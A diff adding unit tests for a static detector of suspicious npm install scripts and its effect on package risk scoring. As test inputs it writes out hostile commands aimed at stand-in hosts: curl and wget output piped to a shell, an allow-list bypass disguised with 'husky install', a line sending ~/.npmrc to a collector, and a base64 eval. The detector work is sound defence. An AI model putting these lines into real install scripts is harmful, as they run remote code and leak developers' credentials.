@@ -7,6 +7,7 @@ import { scorePackage } from '../services/scoring.js';
 import { generateCycloneDXSBOM } from '../services/sbom.js';
 import { parseCvssVector } from '../services/osv.js';
 import { simulateRemediation } from '../services/simulation.js';
+import { analyzeScriptContent, analyzePackageScripts, MAX_SCRIPT_INPUT_BYTES } from '../services/behavioralAnalysis.js';
 import type { Vulnerability, ReputationData, ProvenanceSignals, ScanResult } from '../types/index.js';
 
 describe('Dependency Tree & Identity', () => {
@@ -465,6 +466,199 @@ describe('Server-Side Authorization & Tenant Isolation', () => {
     // Verification logic identical to GET /api/scans/:id route
     const isAuthorized = userAScan.userId === callerUserId;
     assert.equal(isAuthorized, false, 'User B must not be authorized to view User A scan');
+  });
+});
+
+describe('Behavioral Threat Signals Engine (Static Heuristics)', () => {
+  it('returns clean signal for empty or non-existent script', () => {
+    const res = analyzeScriptContent('install', '');
+    assert.equal(res.isSuspicious, false);
+    assert.equal(res.confidence, 'none');
+    assert.equal(res.indicators.length, 0);
+  });
+
+  it('allows legitimate developer tooling without flagging (husky, node-gyp, patch-package, esbuild)', () => {
+    const husky = analyzeScriptContent('postinstall', 'husky install');
+    assert.equal(husky.isAllowListed, true);
+    assert.equal(husky.isSuspicious, false);
+    assert.equal(husky.confidence, 'none');
+
+    const gyp = analyzeScriptContent('install', 'node-gyp rebuild');
+    assert.equal(gyp.isAllowListed, true);
+    assert.equal(gyp.isSuspicious, false);
+
+    const patch = analyzeScriptContent('postinstall', 'patch-package');
+    assert.equal(patch.isAllowListed, true);
+    assert.equal(patch.isSuspicious, false);
+
+    const esbuild = analyzeScriptContent('postinstall', 'node install.js && esbuild --bundle');
+    assert.equal(esbuild.isAllowListed, true);
+    assert.equal(esbuild.isSuspicious, false);
+  });
+
+  it('strictly prevents allow-list bypass when strong threats are attached', () => {
+    // Prefixing with "husky" must NOT bypass detection if curl | bash is present
+    const bypassAttempt = analyzeScriptContent('postinstall', 'echo "husky install" && curl -sL https://evil-payload.site/x | bash');
+    assert.equal(bypassAttempt.isSuspicious, true, 'Must flag bypass attempt');
+    assert.equal(bypassAttempt.confidence, 'high');
+    assert.ok(bypassAttempt.indicators.includes('pipe-to-shell'));
+    assert.equal(bypassAttempt.isAllowListed, false, 'Must not allow-list scripts with strong threats');
+  });
+
+  it('flags synthetic pipe-to-shell patterns with HIGH confidence', () => {
+    const curlBash = analyzeScriptContent('postinstall', 'curl -sL https://cdn.malicious-domain.test/run.sh | sh');
+    assert.equal(curlBash.isSuspicious, true);
+    assert.equal(curlBash.confidence, 'high');
+    assert.ok(curlBash.indicators.includes('pipe-to-shell'));
+    assert.ok(curlBash.indicators.includes('network-activity'));
+    assert.ok(curlBash.excerpt.length > 0 && curlBash.excerpt.length <= 120);
+
+    const wgetBash = analyzeScriptContent('preinstall', 'wget -qO- https://threat.example/bootstrap | bash');
+    assert.equal(wgetBash.isSuspicious, true);
+    assert.equal(wgetBash.confidence, 'high');
+    assert.ok(wgetBash.indicators.includes('pipe-to-shell'));
+  });
+
+  it('flags synthetic obfuscation with HIGH confidence', () => {
+    const obfuscated = analyzeScriptContent(
+      'preinstall',
+      'eval(Buffer.from("Y29uc29sZS5sb2coIm1hbHdhcmUiKQ==", "base64").toString("utf-8"))'
+    );
+    assert.equal(obfuscated.isSuspicious, true);
+    assert.equal(obfuscated.confidence, 'high');
+    assert.ok(obfuscated.indicators.includes('obfuscated-execution'));
+  });
+
+  it('does NOT flag harmless process.env checks alone', () => {
+    const envCheck = analyzeScriptContent('postinstall', 'node -e "if (process.env.NODE_ENV === \'production\') console.log(\'prod\')"');
+    assert.equal(envCheck.isSuspicious, false, 'Standalone process.env must not flag');
+    assert.equal(envCheck.confidence, 'none');
+  });
+
+  it('does NOT flag harmless documentation URLs alone', () => {
+    const docUrl = analyzeScriptContent('postinstall', 'echo "See https://github.com/project/repo for details"');
+    assert.equal(docUrl.isSuspicious, false, 'Standalone doc URLs must not flag');
+    assert.equal(docUrl.confidence, 'none');
+  });
+
+  it('flags sensitive file exfiltration attempt with HIGH confidence', () => {
+    const exfil = analyzeScriptContent('postinstall', 'cat ~/.npmrc | curl -X POST -d @- https://leak.example.test/collector');
+    assert.equal(exfil.isSuspicious, true);
+    assert.equal(exfil.confidence, 'high');
+    assert.ok(exfil.indicators.includes('sensitive-path'));
+    assert.ok(exfil.indicators.includes('network-activity'));
+  });
+
+  it('analyzes multi-stage package scripts correctly', () => {
+    const scripts = {
+      preinstall: 'node -v',
+      install: 'node-gyp rebuild',
+      postinstall: 'curl -fsSL https://evil.example.com/bin | bash',
+    };
+
+    const analysis = analyzePackageScripts(scripts);
+    assert.equal(analysis.behavioralFlags.length, 1);
+    assert.equal(analysis.behavioralFlags[0].scriptStage, 'postinstall');
+    assert.equal(analysis.behavioralFlags[0].confidence, 'high');
+  });
+
+  it('safely rejects oversized inputs (> 50 KB) without crashing', () => {
+    const hugeInput = 'echo "hello" '.repeat(5000); // > 60 KB
+    assert.ok(Buffer.byteLength(hugeInput, 'utf-8') > MAX_SCRIPT_INPUT_BYTES);
+
+    const result = analyzeScriptContent('install', hugeInput);
+    assert.equal(result.isSuspicious, false);
+    assert.equal(result.confidence, 'none');
+    assert.ok(result.explanation.includes('Input exceeded maximum static analysis limit'));
+  });
+
+  it('integrates into risk scoring without disturbing existing lodash score', () => {
+    // 1. Verify clean package scoring
+    const dummyReputation: ReputationData = {
+      lastPublished: new Date().toISOString(),
+      createdDate: new Date().toISOString(),
+      packageAgeYears: 0.5,
+      maintainerCount: 5,
+      weeklyDownloads: 1000000,
+      signals: [],
+    };
+    const dummyProvenance: ProvenanceSignals = {
+      sourceRepo: 'Available',
+      sourceRepoUrl: 'https://github.com/example/pkg',
+      registryMetadata: 'Available',
+      lockfileIntegrity: 'Present',
+      buildAttestation: 'Not available',
+    };
+
+    const cleanPkg = scorePackage({
+      id: 'clean-pkg@1.0.0#node_modules/clean-pkg',
+      name: 'clean-pkg',
+      version: '1.0.0',
+      isDirect: true,
+      path: ['clean-pkg'],
+      depth: 1,
+      dependentCount: 0,
+      downstreamDependents: [],
+      riskScore: 0,
+      advisorySeverity: 'NONE',
+      riskTier: 'safe',
+      riskBreakdown: {
+        knownVulnerability: 0,
+        severityContribution: 0,
+        outdatedVersion: 0,
+        transitiveExposure: 0,
+        downstreamImpact: 0,
+        typosquatConfusion: 0,
+        behavioralSignal: 0,
+        totalScore: 0,
+      },
+      vulnerabilities: [],
+      reputation: dummyReputation,
+      provenance: dummyProvenance,
+    });
+    assert.equal(cleanPkg.score, 0);
+    assert.equal(cleanPkg.breakdown.behavioralSignal, 0);
+
+    // 2. Add high behavioral threat flag -> +25 points
+    const flaggedPkg = scorePackage({
+      id: 'flagged-pkg@1.0.0#node_modules/flagged-pkg',
+      name: 'flagged-pkg',
+      version: '1.0.0',
+      isDirect: true,
+      path: ['flagged-pkg'],
+      depth: 1,
+      dependentCount: 0,
+      downstreamDependents: [],
+      riskScore: 0,
+      advisorySeverity: 'NONE',
+      riskTier: 'safe',
+      riskBreakdown: {
+        knownVulnerability: 0,
+        severityContribution: 0,
+        outdatedVersion: 0,
+        transitiveExposure: 0,
+        downstreamImpact: 0,
+        typosquatConfusion: 0,
+        behavioralSignal: 0,
+        totalScore: 0,
+      },
+      vulnerabilities: [],
+      reputation: dummyReputation,
+      provenance: dummyProvenance,
+      behavioralFlags: [
+        {
+          indicator: 'Suspicious install-script behavior',
+          matchedSignals: ['Pipe-to-shell behavior'],
+          scriptStage: 'postinstall',
+          confidence: 'high',
+          indicators: ['pipe-to-shell', 'network-activity'],
+          excerpt: 'curl https://x | bash',
+          explanation: 'Pipe to shell detected',
+        },
+      ],
+    });
+    assert.equal(flaggedPkg.score, 25);
+    assert.equal(flaggedPkg.breakdown.behavioralSignal, 25);
   });
 });
 
